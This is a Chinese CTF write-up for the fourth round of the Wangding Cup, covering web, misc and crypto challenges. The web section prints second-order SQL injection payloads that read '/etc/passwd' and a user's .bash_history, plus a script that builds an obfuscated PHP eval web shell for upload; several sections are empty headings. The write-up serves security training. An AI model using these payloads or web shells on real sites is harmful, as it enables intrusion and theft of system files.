> 原文链接: https://www.anquanke.com//post/id/158386 


# 网鼎杯 第四场 部分WriteUp


                                阅读量   
                                **277258**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">14</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t01840c5586170a52d9.jpg)](https://p3.ssl.qhimg.com/t01840c5586170a52d9.jpg)

> 本文来自 ChaMd5安全团队，文章内容以思路为主。
<section>如需转载，请先联系ChaMd5安全团队授权。</section>未经授权请勿转载。



## Web类题目

### comment

```
&lt;?php
include "mysql.php"; 
session_start(); 
if($_SESSION['login'] != 'yes')`{`
    header("Location: ./login.php");
    die(); 
`}`
if(isset($_GET['do']))`{` 
    switch ($_GET['do'])`{`
        case 'write':
            $category = addslashes($_POST['category']);
            $title = addslashes($_POST['title']);
            $content = addslashes($_POST['content']);
            $sql = "insert into board set category = '$category',title = '$title', content = '$content'";
            $result = mysql_query($sql);
            header("Location: ./index.php");
            break;           
        case 'comment':
            $bo_id = addslashes($_POST['bo_id']);
            $sql = "select category from board where id='$bo_id'";
            $result = mysql_query($sql);
            $num = mysql_num_rows($result);
            if($num&gt;0)`{`
                $category = mysql_fetch_array($result)['category'];
                $content = addslashes($_POST['content']);
                $sql = "insert into comment set category = '$category',content = '$content', bo_id = '$bo_id'";
                $result = mysql_query($sql);
            `}`   
            header("Location: ./comment.php?id=$bo_id");
            break;
        default:
            header("Location: ./index.php");
    `}`
`}` else `{`
    header("Location: ./index.php");
`}`         
?&gt;
```

可以看到在留⾔的地⽅category存在⼆次注⼊才到发帖处构造payload，即可注⼊

```
category=', content=database(),bo_id='1' ON DUPLICATE KEY UPDATE category='&amp;title=1&amp;content=1
```

对整个数据库查看之后发现数据库中并⽆ﬂag，尝试读取⽂件发现可以读取

```
category=', content=(select load_file('/etc/passwd'), bo_id='1' ON DUPLICATE KEY UPDATE category='&amp;title=1&amp;content=1
```

于是读取passwd发现存在www⽤户，其家⽬录为/home/www 读取⽤户的.bash_history发现了部署过程

### NoWafUpload

> `We no waf！`

解题思路

```
import hashlib
import zlib

def md5(s):
    hash = hashlib.md5()
    hash.update(s)
    return hash.hexdigest()

shell = "&lt;?php eval($_POST['line']);?&gt;"
ret = ""
for i in zlib.compress(shell):
    ret += chr(ord(i) ^ 0xC)

s_len = chr(0x2)
s = md5(ret) + s_len + "\x00" * 4 + s_len + "\x00" * 4 + ret
f = open("line.php", "wb")  
f.write(s)
f.close()
```

最后在根⽬录得到ﬂag

### blog

## Misc类题目

### 双色快

> Download 备⽤下载(密码za3y)
[https://share.weiyun.com/5evIo7h](https://share.weiyun.com/5evIo7h)

```
#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import os
from PIL import Image

def main(gif_file):
    png_dir = 'frame/'
    img = Image.open(gif_file)
    try:
        while True:
            current = img.tell()
            img.save(png_dir + str(current + 1) + '.png')
            img.seek(current + 1)
    expect:
        pass
if __name__ == '__main__':
    gif_file = 'out.gif'
    main(gif_file)
```

然后读取每个png中的对应点的信息，并按照8bit转换为ascii

```
#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import os
from PIL import Image

def main():
    png_dir = 'frame/'
    ret = ""
    for i in range(0,24):
        line = ""
        for j in range(0,24):
            file_name = "frame/" + str(i * 24 + j + 1) + ".png"
            x = j * 10 + 5
            y = i * 10 + 5
            img = Image.open(file_name)
            img = img.convert("RGB") 
            img_array = img.load()
            r, g, b = p = img_array[x, y]
            if g == 255:
                line += "0"
            if r == 255 and b == 255:
                line += "1"
            if len(line) == 8:
                ret += chr(int(line, 2))
                line = ""
     print ret

if __name__ == '__main__':
    main()
```

然后进⾏DES解密即可

### Welcome

> Download 备⽤下载(密码3ujt)
[https://pan.baidu.com/s/1NlgCNoaUdZayOHIBI29yVQ](https://pan.baidu.com/s/1NlgCNoaUdZayOHIBI29yVQ)

## Crypto类题目

### Number

> nc 106.75.64.61 16356

```
from gmpy2 import *
from pwn import *

ip='106.75.106.14'
port=12522

def getnm():
    p=remote(ip,port)
    p.recvline()
    n1=int(p.recvline()[:-1])
    m1=int(p.recvline()[:-1])
    p.close()
    return n1,m1

n1,m1=getnm()
n2,m2=getnm()
p=gcd(n1-m1,n2-m2)

print('n1',n1)
print('m1',m1)
print('n2',n2)
print('m1',m2)  
print('p',hex(p))
print('x1',hex(n1/p))
print('x2',hex(n2/p))
print('y1',hex(m1/p))
print('y2',hex(m2/p))
x1=n1/p
x2=n2/p
flag1=n1%p
flag2=n2%p
print('flag1',flag1)
print('flag2',flag2)
print(flag1)
print(hex(flag1))
print('flag',hex(flag1)[2:].decode('hex'))
```

### shenyue

> nc 106.75.64.61 16356

### shanghai
